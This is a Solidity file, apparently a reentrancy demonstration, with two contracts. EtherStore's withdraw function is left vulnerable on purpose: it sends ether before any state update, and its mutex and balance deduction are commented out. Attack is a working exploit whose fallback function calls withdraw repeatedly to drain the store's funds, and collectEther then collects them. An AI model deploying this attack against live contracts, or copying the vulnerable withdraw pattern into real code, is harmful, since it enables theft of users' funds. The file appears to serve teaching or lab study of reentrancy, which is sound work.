pragma solidity ^0.8.0;

contract EtherStore {
    uint256 public withdrawLimit = 1 ether;
    mapping(address => uint256) public balances;
    // bool public reEntrancyMutex = false;
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        // require(!reEntrancyMutex);
        require(balances[msg.sender] >= amount, "less");
        require(amount <= withdrawLimit,"withdraw limit 1 ether");
        // reEntrancyMutex = true;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success,"Fail");
        // reEntrancyMutex = false;
        // balances[msg.sender] -= amount; // 新版本溢出报错并回滚，0.4.0 之前不会
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function test(uint256 amount) public {
      balances[msg.sender] -= amount;
    }
}

contract Attack {
    EtherStore public etherStore;
    // uint256 public count;
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function pwnEtherStore() public payable {
        etherStore.deposit{value: 1 ether}();
        // start
        etherStore.withdraw(1 ether);
    }

    function collectEther() public {
      payable(msg.sender).transfer(address(this).balance);
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function test() public view returns(bool){
      return address(etherStore).balance > 1 ether;
    }

    fallback() external payable{
      // count++;
      if(address(etherStore).balance > 1 ether) {
        etherStore.withdraw(1 ether);
      }
    }

}
